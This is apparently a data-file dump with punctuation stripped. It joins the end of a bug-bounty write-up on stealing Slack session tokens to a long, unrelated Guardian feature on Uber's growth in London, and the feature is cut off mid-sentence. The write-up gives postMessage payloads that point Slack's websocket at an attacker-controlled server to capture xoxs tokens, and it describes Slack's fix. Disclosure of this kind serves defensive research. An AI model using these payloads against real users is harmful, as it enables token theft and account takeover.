at the handler list  I noticed there s also a method called goodbye    goodbye   function   imsg     if    TS   lazyLoadMembersAndBots     return   TS   info    Got a goodbye message  so disconnecting from the MS     TS   ms   disconnect        Now it turns out that Slack had a setting called fast_reconnects_enabled set to true   This one made it possible for me to run the reconnect_url  event  then run the goodbye  event to make it reconnect  I had a lot of issues with it in the beginning  as it was giving me long delay reconnect times  so it wasn t really clear it would work   Building it all together  When putting everything together this was what I had   We start our own web socket  which only has one job  to listen to the token parameter being sent  saving it on the server  When the victim clicks the link on our malicious page  we open a new window sending the victim to https   slack com call me and save the reference of the window as var b   We also start a little polling script that looks if our WebSocket took the token from the request  We then send the following postMessage to reset the socket URL  b   postMessage     origin_window_type     incoming_call     message_type     ms_msg     msg      reply_to    false    type     reconnect_url     url     ws   your socket domain 9001 websocket AAA            Every 2 seconds we also run the goodbye  call to make sure the socket connection gets interrupted  b   postMessage     origin_window_type     incoming_call     message_type     ms_msg     msg      reply_to    false    type     goodbye            As soon as the slack com window connects to our own socket  we dump the token  which our polling will find  then use it to gather data from the auth test endpoint in the Slack API using the xoxs  token   We have successfully stolen the token from the user   I made a short movie to show the scenario when everything runs together   Mitigation  The solution Slack made was to validate the origin from the messages using the following technique   if    TS   utility   calls   verifyOriginUrl   event   origin      return       verifyOriginUrl   function   originHref     return TS   utility   url   getHostName   originHref      window   location   hostname        getHostName   function   url     if    url   return      var a   document   createElement    a     a   href   url   return a   hostname     Update  Slack corrected the fix to the one above due to a separate report made by another person  being able to post messages using an empty event origin   The bypass was also posted in a Reddit comment     I sent the report to Slack on a Friday evening  They responded 33 minutes after my initial report and had a fix out 5 hours after that  Amazing     Thank you Slack for a quick fix  and the bounty of  3 000     Link  Report  207170 Stealing xoxs tokens using weak postMessage   call popup redirect to current team    Until next time,"[1068 1049 1095 1101 902 613 1422 576 314 92 298]"
1086,training-dataset/business/787.txt,business,How Uber conquered LondonEvery week in London  30 000 people download Uber to their phones and order a car for the first time  The technology company  which is worth  60bn  calls this moment  conversion   Uber has deployed its ride hailing platform in 400 cities around the world since its launch in San Francisco on 31 May 2010  which means that it enters a new market every five days and eight hours  It sets great store on the first time you use its service  in the same way that Apple pays attention to your first encounter with one of their devices  With Uber  the feeling should be of plenty  and of assurance  there will always be a driver when you need one   When you open the app  Uber s logo flaps briefly before disappearing to reveal the city streets around you  and the grey  yet promising shapes of vehicles nurdling nearby  The sense of abundance that this invokes can make you think that Uber has always been here  that its presence in your neighbourhood is somehow natural and ordained  But that is not the case  To take over a city  Uber flies in a small team  known as  launchers  and hires its first local employee  whose job it is to find drivers and recruit riders  In London  that was a young Scottish banker named Richard Howard   Howard was 27 and had recently been made redundant by HSBC  where he sold credit default swaps  a form of derivative that became notorious during the financial crisis  He grew up in Glasgow  where his father sold musical instruments  and never felt entirely at home in the deferential  bonus driven atmosphere of investment banking  When he lost his job in November 2011  Howard figured that tech must be the coming thing  He began to trawl technology news and  like a lot other people  was struck by reports of a fundraising round for a startup called Uber the following month  It wasn t just the money   a valuation of  300m for a company that had been up and running for 17 months   but the seriousness of the players involved  Jeff Bezos  the founder of Amazon  Menlo Ventures  one of Silicon Valley s oldest venture capital firms  Goldman Sachs   On 7 December  Howard found Uber s website and sent them an email   I emailed whatever it was  help uber  info uber  and said   Hey  I would love to work with you guys  I live in London  Are you coming to London    he told me recently  By Christmas  Uber had replied  After a couple of Skype interviews  Howard travelled to Paris to meet the Uber team there   at the time  Paris was the only city outside North America where the company was operating   and in February 2012  Howard was hired  He filled in his contact information on a company wide spreadsheet  He tried to work out whether he was Uber employee number 50  or 51   How Uber conquered London Read more  Uber began as a luxury brand  Its tagline was  Everyone s Private Driver   The company s origin myth is that its two founders  serial entrepreneurs Garrett Camp and Travis Kalanick  emerged from a tech conference called Le Web in Paris in December 2008 and couldn t find a cab  In the age of smartphones and GPS  this seemed to them a ridiculous state of affairs  From the get go  though  Uber s idea of a car and driver was something lavish and fun  Unlike its main rival in the US  Lyft  whose ride sharing philosophy derived more from a hey I m going that way anyway approach  Uber was built on selling bite sized access to big black cars and Kalanick s memorable   if slightly untranslatable to British ears   wish to  be a baller    For Howard  in London  setting up Uber meant finding the right kind of cars  He worked his way through yell com  ringing up high end chauffeur companies and trying to persuade drivers to accept jobs from an app they had never heard of   Uber likes to describe itself as a marketplace  for a commission  it connects drivers and passengers  sets the fee  and handles payment   In late March  Kalanick  who by this point was Uber s CEO  flew to the UK and emailed his only employee in the country   Yo London  I m here   he said  The two men met in Moorgate and Kalanick outlined his plans for the city   He said  I want to get  Mercedes  S classes on the road for the same price as black cabs   Howard recalled   London was the 11th city that Uber went into  but it was like no other taxi market that the company had attempted to disrupt  London had the scale and mass transit systems of New York  but it also had the medieval  twisting streetscape and complex regulations of other European capitals  It was already served by a formidable private transport market  with one of the world s most recognisable taxi fleets   the black cabs   and a fragmented scene of some 3 000 licensed  private hire  operators  Just one of these  Addison Lee  had 4 500 cars and revenues of  90m a year  London even had ride hailing apps  led by Hailo  which had already signed up 9 000 black cab drivers  Kalanick has described London as the  Champions League of transportation  and said that Uber spent two years plotting its approach to the city   Howard rented a one room office on the King s Cross Road  next door to an Ethiopian church  Two launchers  from Seattle and Amsterdam  arrived  He put a sign on the wall that said   Hailno  and tried not to think too much about the competition   We were worried   he told me   We were worried that Addison Lee would get smart  spend  1m   which isn t a lot of money for them   and make a really nice  seamless app that copied Uber s  But they never did    Facebook Twitter Pinterest Travis Kalanick  the CEO of Uber  Photograph  Adnan Abidi Reuters  Instead  Howard focused on what he was good at  which was getting sceptical drivers into the office  showing them how Uber worked and giving them a free iPhone   I am a salesman   that s what I am   he told me  Howard went after Mercedes S class and BMW 7 series drivers  typically one man operations  who might freelance for a number of small chauffeuring companies  He made them a special introductory offer  they would be paid  25 an hour to work on the Uber platform whether they got any jobs or not   We gave these guys a security that they didn t previously have   he said  Chauffeurs could sign up for as many or as few hours as they wanted  and they could log off if an existing client came calling  They earned money sitting in their cars  In a trade where drivers typically earn  50 an hour when they are working  but can go whole afternoons  days even  without a job  and have punishing running costs  Uber sounded almost too good to be true   Driver No 1 was Darren Thomas  Before he joined Uber  most of his work came from Spearmint Rhino  the lap dancing club  Thomas had drifted back into chauffeuring after working for seven years as a salesman in the tiling industry  He signed up for as many hours as he could bear   I absolutely caned it   he told me  Soon he was earning  2 500 a week  On Uber s first day in London  in the middle of June 2012  Howard had around 50 drivers on the platform  They did only 30 trips in 24 hours  but there was a single  glorious moment when seven rides were under way simultaneously and Kalanick happened to log in from San Francisco   Travis was just blown away   said Howard   He was like   Guys  look at London  This is unbelievable   It was just kismet  I guess    The idea was to get Uber up and running in London in time for the 2012 Olympics  Howard s job was to get drivers on the road  to provide that feeling of plenty if someone should open the app  San Francisco never sent him download numbers  but he had an endless stream of maps  showing where people were looking for cars  including dreaded  zeroes  when nothing appeared on users  screens  Many of Uber s first customers in London were American tourists who idly checked their phones to see if the service had spread  Howard spent his days on a Boris bike  nosing around the streets of Belgravia  trying to sign up snoozing chauffeurs  and his nights glued to  Heaven    the Uber eye view of all the cars active in the city   worrying about things going wrong   It was honestly a 24 7 job   he said  If there were 15 drivers on shift  and Howard needed 20  he would get on the case  chivvying chauffeurs onto the street  If a passenger lost their bag on the way to Boujis  Howard s phone would ring at 3am  His wife hated it  The rest of his family nicknamed him Eileen  after the cab dispatcher on Coronation Street   It was stressful as fuck   he said   But I loved it    In a trade where drivers can go whole afternoons  or days even  without a job  Uber sounded almost too good to be true  Howard only caught occasional glimpses of larger plans in the works  Despite starting out with a niche product  Uber has always considered itself in Promethean terms  In 2011  when the company only had a few dozen employees  it spoke of filling a global  transportation gap  that had grown from the failure of car services around the world to properly exploit modern technology  On a pre launch visit to London  Kalanick and the company s head of operations  Ryan Graves  spent a week riding black cabs  tinkering with Hailo  and considering Uber s future  One afternoon  Howard found himself in Kalanick s room at the Sanderson Hotel  in Covent Garden   Graves was there too  along with a couple of Uber engineers over from San Francisco  Kalanick was thinking aloud  kicking around big ideas  Aged 35  and with a string of tech startups to his name  Kalanick had a bold  imposing demeanour  Kalanick s Twitter profile picture at the time showed the figure from the cover of Ayn Rand s capitalist fantasia  The Fountainhead  That day  he was wondering about whether Uber had the potential to become a mass market product  It would mean becoming less cool  but it would also involve taking aim at a global market worth hundreds of billions of dollars   He was thinking  Do we make Uber cheaper  Do we go for the jewel   for taxis   Howard recalled   No one thought it was a good idea  Howard said something about protecting Uber s luxury brand   Travis was like   I don t care about the brand  If we don t cannibalise ourselves  someone else will cannibalise us    He asked everyone to leave  When the group returned  a few hours later  Kalanick seemed to have made up his mind   He said  We re going to do Uber cheaper   That July  the company trialled a new budget service  UberX  in San Francisco  Then it took over the world   In London  it remained all about the high end  Howard and his team  by September  there were three people in the Uber office  plus an intern  figured that early adopters would be from the tech scene  in Shoreditch and Old Street  but the app initially caught on in the nightclubs of the West End  On Friday and Saturday nights  the platform frequently ran at 100  capacity  Howard devised a geography test for new drivers so they could meet the demands of the Made in Chelsea set  Berkeley Square  Nobu  Soho House  The Dorchester  Uber laid on cars for parties and Howard gave away hundreds of free rides  By the autumn  he had around 100 drivers on his books and an  allowable burn  of  50 000 a week to recruit drivers to the platform   I was often told   Burn more    he told me   We never had a numbers target  It was always just more drivers  more drivers  more drivers    Facebook Twitter Pinterest Richard Howard  Uber s first London employee  Photograph  Felix Clay for the Guardian  For those signing up to work  Uber was like nothing they had experienced before  It wasn t just the money  Even in its embryonic phase  chauffeurs have told me  driving for Uber meant simply not encountering many of the standard irritants and daily corruptions that constitute life in London s private hire industry   the shadow world of its heavily regulated black taxi trade  There was no tyrannical dispatcher  giving the plum jobs to relatives and arse kissers  just an algorithm matching the nearest car to the nearest rider  There was no cash  no pulling up late at night next to bank machines  no fussing around for change  And there was the rating system  Uber riders and drivers rate their respective trips out of 5  Drivers got feedback  and they also had a voice   For once  everything felt transparent and straightforward  The app looked good  it worked  and Uber s early passengers were well heeled and for the most part polite   It was surreal   said one driver who joined the platform in September 2012   It was something so fresh   Thomas  the first driver  told me that chasing jobs in the early days of Uber was  a bit of a game in a way  a bit of fun   After six months  Uber began to replace the guaranteed hourly rate with pay by commission  but the money for drivers held up  Word   and wild rumours   spread fast about the new service  Three years later  two thirds of Uber drivers in London have been referred by a friend   Ruman Miah first heard about Uber that autumn  A stocky  thoughtful man  Miah had grown up in the East End  His father  a Bangladeshi immigrant  arrived in the UK in 1962   He was a Del Boy   Asian version   he told me  On Sundays  Miah s father would bring his son second hand computer parts to fix  Miah worked for the NHS  in IT  before being made redundant in May 2012  He already had a private hire licence  as a back up plan  and became a minicab driver  somewhat reluctantly  that summer  Miah was unusual among his fellow drivers because he began to note down every job  every fare  and every one of his many and varied costs  on a set of spreadsheets that he kept on his phone  from the data plan on his mobile to the class four national insurance that he paid now that he was self employed  and the weekly  depreciating value of his Ford Galaxy  He set aside time on Sundays to stay on top of his data   That s how I think   he said  When he worked for the NHS  Miah kept a diary of his lunch costs   I don t know if it is something my father installed in me  but I have to note it down  It is a must  If I don t  I feel anxious  I can t explain it    Are you ready for a future where we re all reviewed like Uber drivers    Arwa Mahdawi Read more  A friend told Miah that if he could get hold of a Mercedes S class  a new company called Uber was paying drivers  50 an hour  He couldn t afford such an expensive car  so he let the idea go  In spring 2013  however  he encountered Uber again  He was between jobs at Heathrow  having a coffee at the Bath Road McDonald s   a hangout for private hire drivers at the airport   when someone came in  handing out leaflets   It was a young hipster   said Miah   Most of the drivers just ignored him    But the hipster was bearing big news  UberX was coming to London  The launch of the new  cheaper service in San Francisco the previous summer had defied all expectations  Rather than simply competing with existing car services  there were signs that Uber s platform   with its ability to match huge volumes of vehicles  riders  and overlapping journeys   could create massive efficiencies  cheaper fares  and  potentially  a whole new customer base   Christophe Lamy  who was hired from Goldman Sachs  London technology division  had the job of bringing UberX to the capital  He studied the city s two  hitherto stratified classes of car service  expensive  but convenient black taxis and Addison Lees  and reasonably priced  unreliable minicabs  In London  UberX was designed to be as efficient as a black cab and as cheap as a minicab  Anyone with a private hire licence   a  250 permit given out by Transport for London   a relatively new saloon car and insurance  could apply to drive  Lamy sensed the power of the proposition immediately   On both sides we beat what the competition was doing   he told me   All of us were like   This is the choice you are going to go with    Four thousand drivers signed up for UberX in the first six months   Miah and Lamy  the minicab driver and the former banker  exchanged emails in July 2013  Lamy wrote that a Toyota Prius was the company s  dream car  for UberX  Miah was trying to make things work on the executive circuit with a Volvo S40 at the time  He was cautious  He was sceptical about UberX s low fares  at  1 75 per mile  they were half the  3 50 to  4 that his car companies were charging  On the other hand  the commission Uber was charging was lower  20  v 50   Miah crunched the numbers  He kept hearing good things  The Volvo got through a lot of diesel  In May 2014  after yet another friend had joined Uber  and he heard about a new  1 per job bonus scheme the company was running  Miah put  2 500 down on a brand new  gunmetal grey Toyota Prius and joined the platform   Facebook Twitter Pinterest Ruman Miah  an Uber driver from east London  Photograph  Felix Clay for the Guardian  On the day that everything changed  Lamy was exhausted  It was Wednesday  11 June 2014   a few weeks after Miah joined Uber  For months  there had been rising unease among black cab drivers towards UberX  and now they planned to hold their first demonstration against the company  as part of a series of synchronised taxi strikes across Europe  Lamy had worked through the last two nights to prepare for the disruption  and he spent the morning napping on a sofa in the office  During the afternoon  between 4 000 and 10 000 cabbies stopped work to protest against UberX  turning their cars sideways on Lambeth Bridge and bringing gridlock throughout Westminster  as far as Piccadilly Circus  Jo Bertram  a former McKinsey consultant who was now running Uber in London  gave her first interview to Sky News at 6 30am   and 15 more after that  After two years trying to persuade journalists to write about Uber  now it was all anyone wanted to talk about  Uber downloads jumped by 850    The cab protest   its crudeness  the inadvertent publicity it gave to Uber   read like the classic  bungling behaviour of a doomed market incumbent  Until Uber came along  the business of private transport in London had held more or less the same shape for the last four centuries  a trade dominated by a skilled guild of coachmen  able to ply for hire on the streets  with a shadow industry of occasional jobbers and private chauffeurs  making a quiet living on the side   After the first official licensing of hackney carriage drivers in 1838 and the formalisation  decades later  of  the Knowledge   London s black cab drivers ruled the roads more or less unchallenged  They offered a well regulated  high quality product  but they didn t adapt much either  In the 30 years between 1986 and 2015  during which London s economy doubled in size and its population increased by almost 2 million people  the number of black cabs rose from 19 000 to 22 500   In the process  they became some of the most expensive taxis in the world   We concentrated on the honeypot   Derek O Reilly told me  O Reilly started driving a taxi in 1995  and  until late last year  helped run Knowledge Point  a training school for cabbies not far from King s Cross  Without enough cars to cover the city  and much of the fleet locked in worsening congestion in central London  where the average traffic speed has fallen from 12 to less than eight miles an hour since the 1980s  black cabs became vulnerable to competition  Even small bore innovations that had been adopted by taxi drivers around the world   such as GPS  or taking payment by card   were taken up spottily or not at all by traditionalists who loved to lean across  pull down the window  ask  Where to   and hare down to the Embankment through a maze of remembered turns   You perceived the way your marketplace was  was going to be like that for ever   said O Reilly   Since UberX came to London  it has actually been very difficult to objectively measure its impact on the black cab trade   The one thing I can t answer  and which I would love to be able to answer  is to what extent have they grown the market  versus to what extent have they taken work away from the traditional sectors   said Garrett Emmerson  who is in charge of surface transport at Transport for London  Since 2013  Emmerson pointed out  the number of taxis on the road has stayed steady  as has the number of those taking the Knowledge   There were 892 new taxi drivers last year  compared with 760 in 2010   But the view through the windscreen is different  Judging on the evidence of his own eyes  O Reilly  like most black cab drivers  has come to believe that the threat of Uber is mortal  In 2015  he watched the number of people coming to his weekly introductory talk on the Knowledge drop from 60 to six   At the end of the year  the school moved to a smaller premises around the corner   A 20 minute  two mile trip in a black cab costs  14  An Uber will get you there for  8   I genuinely believe their aim is to wipe us out   O Reilly told me   Starve black taxis into submission and then run riot with that marketplace    Angry cab drivers gridlock Europe in protest at  unregulated  taxi app Read more  For those who know their history  there are reasons to be fearful  Hiring someone to take you across town goes back a long way in London  but the past is notched with moments when one form of technology supplanted another  In the 17th century  it was the Thames watermen who got it in the neck  They had apprenticeships of seven years to learn the slide of every muddy current  and routes recorded in the Domesday Book  But bridge building and the arrival of the horse and carriage   a faddish continental import during the reign of Elizabeth I   did for them   The caterpillar swarm of hirelings  They have undone my poor trade  whereof I am a member   wrote John Taylor  the watermen s poet and leader  in a 1623 pamphlet titled The World Run on Wheels  Broken and dismayed  he retired to run a pub   After a brief tussle with sedan chairs  horse drawn hackney carriages ruled the streets for the best part of 300 years  They saw off the first cars  a small fleet of electric  Hummingbird  cabs  at the turn of the 20th century  but succumbed suddenly after that  London s first petrol driven taxi was licensed on 11 December 1903  Ten years later  on the outbreak of the first world war  there were 7 000  During the same period  Hansom cabs  small  swift horse drawn two wheelers that had been ubiquitous in the capital since the 1830s  virtually disappeared  By 1927  there were just 12 left in London  curios from a recently vanished past   When I talked to black cab drivers or minicab operators about Uber  I noticed that they normally wanted to question whether its cars and drivers were any good  A cabbie will bend your ear about how GPS will never beat the Knowledge and how a Prius corners like a ship  compared with a London Taxi Company TX4  But in a way that is to confuse Uber with what has come before  What is novel about Uber as a personal transport company is that it does not actually care about the relative merits of cars  or boats  or horses  or sedan chairs  or even the people who steer them  The world s largest taxi firm does not own a single vehicle  or employ a single driver  The product for Uber is movement itself  and deploying the necessary labour for that to happen   When I spoke to Lamy about what was different about Uber  the conversation wasn t about diesel consumption or the quickest way to get to Waterloo  it was about liquidity  Liquidity used to be something you associated with the stock market  he explained  But now sharing networks such as Uber and Airbnb are making assets and labour available to consumers in ways that were simply not possible before   The way I see it  Uber brought a liquid market transaction system to transportation   he said   And once you had come up with this mechanism that could create liquidity in the market  it became inevitable    The world s largest taxi firm does not own a single vehicle  or employ a single driver  Richard Howard left Uber before the launch of UberX  When we spoke  he turned briefly mournful about the demise of black cabs one day   It s sad  but it s also part of progress   he said   They re going to be like artisans  They re going to be like people who make their own shoes    Some time in the second half of 2015  the number of Uber drivers in London surpassed the number of black cab drivers  and now stands at around 25 000  An Uber trip starts every second in the capital  and as the company has become more dominant  it has turned more gracious to the competition  In February  Uber even invited taxi drivers to join its platform  and suspended any commission it would take for a year  In conversations with Uber executives  the word that they choose when talking about black cabs is  heritage    I recently paid two visits to Uber s present London headquarters in Aldgate Tower  an office block with rounded edges on the trendy  easterly border of the City  The company has around 100 staff in the UK now  and has spread to 15 cities  including Birmingham  Cardiff and Leicester  All visitors are asked to sign a non disclosure agreement at reception  Inside  the offices had a spare  recently moved in feel  Behind a number of desks  silver  1  balloons were tethered to chairs  indicating various employees  first  Uber versaries   and a whiteboard displayed a graph  curve and equation under the heading  Cancellations    In a boardroom  Tom Elvidge  London s 34 year old general manager and another Goldman Sachs alumnus  gave me a presentation on the company s global progress and many of the smart  intuitive features that make Uber such a pleasure to use  The real time view of your driver approaching  An average waiting time in London of 172 seconds  The ability to estimate your fare  share your ETA with friends  and split the cost  Permanent records of every journey taken  The rating system  Elvidge put up a slide showing a steepening cluster of coloured lines   each one indicating a separate city   and explained how each new Uber market outperforms the last because of the pent up demand among drivers and riders eager to join the service   One reason Uber decides to move to a city is the number of people downloading and opening the app there   Elvidge studied the graph for a moment   This is out of date   he said  It didn t show China  where Uber operates in 55 cities   Later  Elvidge took me down to Uber s partner service centre  PSC   where it trains its drivers and looks after their concerns  The PSC was in an underpass 100 yards from the company s corporate offices  in a former wine bar  It had a jaunty  black and white check floor and a spiral staircase  no longer in use  In one corner  bathed in white light  applicants had their pictures taken for their ID  At the far end  a group of drivers sat waiting for appointments to discuss difficulties they were having with the platform  One had brought his sons  and the boys  in parkas  were larking about on the chairs  There were banners for deals on car financing and insurance    Rent an Uber ready vehicle today   read one  from Cabmate   and a sign showing the way to a prayer room   Very important   said Elvidge  A large number of Uber drivers in London are Muslim men  On our way into the centre  we were briefly detained by a tall prospective driver in shalwar kameez who went round twice in the revolving door and came out muttering   What is this place    Facebook Twitter Pinterest Tom Elvidge  Uber London s 34 year old general manager and Goldman Sachs alumnus  Photograph  Felix Clay for the Guardian  The physical separation of the PSC and Uber s corporate offices made manifest the gulf at the heart of the company  which is between those in charge of the network  and those who make their living driving on it   Official documents refer to Uber drivers as  customers    Almost every Uber executive in London that I spoke to  past and present  used to work for a large consulting firm or bank   Uber s head of communications in the UK is Alex Belardinelli  a former special adviser to Ed Balls   For their part  the dozen or so drivers that I interviewed for this article  who provide the capital  insurance  and manpower for Uber s miraculous service were   again  almost without exception   from immigrant communities and had worked previously in corner shops  supermarkets  low paid public sector jobs  or as minicab drivers  According to Uber  around a third of its drivers in London come from neighbourhoods with unemployment rates of more than 10    And to a large extent  during these manic years of growth  many of them don t seem to care about the divide that exists between Uber s executives and its labourers  On a recent bright morning  I went to Woodford  in east London  to meet Ben Tino  a 24 year old driver who joined the platform in February last year  Tino is from black cab stock  His uncle drives a taxi  He rode a scooter  studying his runs for more than a year   the Knowledge typically takes three   before signing up to drive for Uber  I asked him why   It might sound funny   he told me   but it was really  really cold   He was knocked off his moped three times  Since then  Tino has driven more than 2 500 trips for Uber with a rating of 4 9 in a Citroen C4 Grand Picasso   To me  Tino came across as the personification of a 21st century  networked driver  He liked everything about Uber  from the platform s hints  people take more Ubers on payday Fridays   to its capricious  surges   when demand swamps supply  and prices can double  even triple for drivers   to its element of surprise  Drivers do not know where they are going until the passenger is in the car  and they swipe the screen   It s like being in the bookies   said Tino   It is very  very addictive   He was reassured by the sense that his trips were constantly monitored  When someone got into his car recently and poured beer all over the floor  Tino didn t say anything  He just took pictures of the mess and sent them to Uber  which charged the passenger for the cleaning bill   For me  what you put in is what you take out   he said   It drives you  It makes you a better person in a way    In Southall  I spent an afternoon with Hassan Mirza  a former maths teacher from Pakistan who moved to the UK in 2005  Mirza studied for a degree in computer science  but couldn t find a job in IT  He spent five years working as a security guard in shopping centres in Southall and Hounslow before a friend  who worked in Primark  signed up for Uber and showed him a payslip for  963   I said   Is this your monthly   And he said   Are you joking  man  It s my weekly    Mirza applied for his private hire licence the same day  and joined Uber in October last year   It gives me a lot of happiness   he said   Any time you feel like working  you go out  You re not feeling well  you go home and sleep  Obviously  you get life once and you want to live like that  You are the boss    We pulled up behind the Iceland where Mirza used to work  A broad  extrovert man  Mirza makes YouTube videos for other Uber drivers  in which he relives such escapades as  Low Rated Rude Guy    Who are you giving orders to  Who are you commanding  You re talking to Hassan  mate  Lower your tone   With his degree in computer science  he delights in the sheer aptitude of the system   It is so clever   he said   whoever built it is genius   After years on his feet  feeling overqualified and underpaid as a security guard  Mirza was proud to share in Uber s prestige and its disruptive power   I am a partner of a big company who has changed the game   he told me  Mirza wanted to know if I had heard about a new word   uberising   which was due to enter the dictionary soon   Like any company  if it blows the market all of a sudden   he said   It makes me feel good to be part of a company that uberises    Both Tino and Mirza were adamant that their lives had improved since they started driving for Uber  The only times our conversations stumbled were when it came to the nitty gritty of how much they earned  and the precise nature of their relationship to the company  Tino told me that he typically works between 50 and 60 hours a week for Uber  earning  800  Owning his car outright  his costs came to around  160 a week  When I suggested that this made for an hourly wage of between  10 and  12 an hour  Tino shook his head   Nah  it s more than that   he said  and told me he earned  16 an hour   According to Uber  average driver pay is  16 an hour   When Mirza set out his projected earnings for the year  he forgot to deduct the cost of his private hire insurance  which all drivers must have and which often comes to around  4 000  Ultimately  he wasn t sure whether Uber worked for him  or if he worked for Uber   To be honest with you  it s a difficult question   he said   I am my own boss   but if my rating goes down I am fired  So technically they are the bosses   Mirza paused   But I don t think like that    Facebook Twitter Pinterest Uber s partner service centre  PSC   where it trains and looks after the concerns of its drivers Photograph  Felix Clay for the Guardian  These were the kinds of awkward details that began to prey on Ruman Miah s mind about six months after he started driving for UberX in the spring of 2014  Accustomed to noting down his fares and costs  he was pleased  at first  by how much he was able to clear on the Uber platform  With his outgoings figured out at  371 per week before tax  including everything from three car washes per week  two MOTs per year  and the wear and tear on his tyres   Miah was still able to take home more than  800 weekly  in part because of a  99 per week bonus scheme that Uber was running to entice new drivers    When I joined  I loved Uber   Miah told me   There is no humans  For me that was a big thing  a humongous thing   By the time he signed up for Uber  Miah had been a private driver in London for almost two years  He knew his back routes  He once made it from Walthamstow to Heathrow Airport during the morning rush hour in 54 minutes  He had a rating of 4 9   Things began to change towards the end of the year  Miah installed a hidden camera in his car after a run in with a passenger who was drunk and became angry after she thought he was taking her the wrong way  Miah had heard from other drivers that Uber tends to side with riders in disputes  When the woman kicked his car door and damaged it  he didn t report her  He began to perceive the rating system not as a mechanism of mutual feedback  but of unequal power  A 1 star rating for a passenger barely means anything  you can find your Uber rating within the help section of the app  but it can have lasting consequences for a driver  Three weeks with a 4 5 rating in London means you are in danger of being called in by Uber for what the company calls a  quality session    Oh my god  the star rating   Miah said   It is constantly in your head  and it hits you  am I going to get rated low  Am I going to get a complaint against me   He saw other drivers giving out water  sweets  and asking for five star ratings and decided it was beneath his dignity   On his days off  Miah began to read more about the company he had signed up for  and its impact on the cities where it has spread  Since expanding rapidly overseas in 2012  Uber has been accused of breaching regulations in France  Belgium  the Netherlands  Germany  Canada  Australia  New Zealand and Brazil  In the US  Uber faced 50 federal lawsuits alone in 2015  in cases that tested the company s liability for assaults by its drivers   deceptive pricing  and alleged discrimination against disabled people  Last week  Uber settled   for up to  100m   two major lawsuits that could have forced the company to recognise drivers as employees  On top of its legal troubles  Miah observed that Uber also seemed to follow a similar commercial playbook in every city that it entered  at a certain point  the company would flood the market with drivers  and then begin to cut prices   In London  the number of private hire vehicles jumped sharply   up 13 000  or 25    in the two years following the launch of UberX  The first price cut took place in August 2014  A few weeks later  on a visit to the capital  Travis Kalanick announced that he wanted 42 000 drivers in London  six times as many as were on the road at the time   Uber denies this is an official goal   In such a crowded marketplace  and with prices falling all the time  Miah did not see how his sums could continue to make sense  That December  his weekly takings from Uber fell to around  800    430 after his costs   or just over  7 an hour  Miah is well versed in Uber s corporate sayings   All our innovation is pointed at lowering prices not raising them   he said to me at one point  as much in wonder as in frustration   All this innovation  What are you innovating    Uber s transformation of the global taxi industry rests on a theorem  It is that by adding huge volumes of riders and drivers to a given market   liquidity   taxis can become cheaper and drivers can earn more at the same time  To understand how this can be so  you need to stop thinking about drivers being paid per journey  and instead consider how many more trips they are able to make as part of an efficient network  A typical taxi spends between one third and half of its shift idle  Place that vehicle on a ride hailing platform  though   in a buoyant  busy market with the smartest vehicle dispatching algorithms known to man   and that dead time will rapidly diminish  meaning it can pick up more jobs   In three years  Uber drivers in New York have seen their idle time on the platform almost halve  from 36 minutes per hour  to 20  As that figure shrinks further  and cars and drivers are used more and more intensively   and drivers are therefore earning almost constantly   Uber will be able to cut fares lower than you thought they could possibly go  The endgame that Uber envisages is what it calls the Perpetual Trip  drivers on a never ending chain of pick ups and drop offs   Facebook Twitter Pinterest Hassan Mirza  an Uber driver from Southall  west London   I am a partner of a big company who has changed the game   Photograph  Felix Clay for the Guardian  It takes a moment for this notion to sink in  that with more drivers competing for cheaper fares  everybody can still come out on top   American drivers have begun to call this  Uber math     It is super counterintuitive until you have dug into the data and seen it for yourself   said Jo Bertram  who now runs Uber s British  Irish and Nordic markets  But if you accept the win win logic of Uber s network effects  then it can override all other objections you might have about the service  Last October  Uber published data from New York showing that even as driver numbers had doubled  and fares had fallen   partners  were earning 6 3  more per hour than they were the year before   Similar data for London has not been released    That is the magic of Uber  right   Lamy  the architect of UberX in London  told me   You can charge the user less and the driver earns more    The only trouble with  Uber math  is how it feels to be part of the labour force that delivers it  A founding principle of Uber is that it is a mere broker that enables riders and drivers to come together  and the company never tells anyone what to do   I think the extreme edge of our nudging is very  very hands off   Elvidge  London s general manager  assured me  But for the network to grow  and the graphs to steepen  Uber needs its platform to be ever more responsive  In London  drivers have 15 seconds to decide whether or not to accept a job  If they refuse three in a row  they are logged out of the system for 10 minutes  Last month  Mirza  whose YouTube videos generally extol the platform  was banned from taking jobs from Heathrow airport for four weeks for cancelling one too many requests  He posted a video titled  Do we work with Uber or for Uber    When I asked Alex Rosenblat whether she thought Uber was a neutral marketplace  she laughed  Rosenblat is a researcher at Data   Society  a thinktank in New York  Last year  she spent 10 months monitoring online forums of Uber drivers in the US  After collating the views of thousands of drivers  studying their experiences of surges  nudges from the platform  threats of deactivation for their ratings or refusals of incoming jobs  Rosenblat and her co author  Luke Stark of New York University  came up with the phrase  algorithmic management  to describe the way that Uber controls its drivers through a set of mostly automated commands  According to Rosenblat  there is very little about Uber which is light touch  from its categories of cars  to the clarion calls of its leader  Kalanick  through the media   There is a lot of information and power asymmetry built into the Uber system   she told me   If there was one way to characterise drivers  relationship to Uber it would be through this lens of asymmetry  which narrows the kinds of choices that drivers have to accept    And then there is pay  According to Uber  the median driver in London spends 27 hours a week on the platform  and earns  16 an hour  These figures are almost meaningless  however  because of the variety in costs that each driver has to bear  Bertram assured me that the company studies what its drivers are earning  every day and every week  and that Uber could not be growing at the rate it is without getting its incentives right  But one of the sensations involved in taking part in a marketplace where prices are always going down is to feel that your work is worthless   The experience is happening on a daily basis maybe 20 times   one Hungarian driver in London told me   You take 20 different passengers and 20 times you felt cheap  Even if you get to the end of the week and you make the same money  it doesn t feel the same    Since last January  when Uber introduced simultaneous price cuts in 48 American cities  the company has had to battle a small but determined current of dissent among its own drivers who are convinced that they are losing out  The protests reached London  in the form of a demonstration by the GMB union  last December  A few weeks earlier  Uber had raised the commission it would take from new drivers from 20  to 25   The more drivers have complained  the more adamant Uber has been that they are wrong   They have got protests over wage cuts and local operations managers will come out and say   No  But I have a graph that says you are going to earn 17  more    said Rosenblat   They can say that over and over but the drivers are just like   I know what I took home in my pay last month     Miah was never able to make the Uber math add up  His personal spreadsheets  his log of thousands of journeys across London  compiled over the years  told him there was a limit to what any individual driver can achieve  however liquid the system becomes   If I pick you up from Shoreditch High Street and you want to go to Soho it is not going to take 15 minutes   he said   Whatever route you want  you can cut in from Charing Cross  you can come in from Marylebone Road  Where is this evidence that a driver can do several hundred jobs in an hour    Last May  an old man drove into the back of Miah s Prius after he had dropped off a passenger in Sutton  The accident proved something of a watershed  Miah s back was injured and he became depressed  He had been dismayed by cab operators before  but 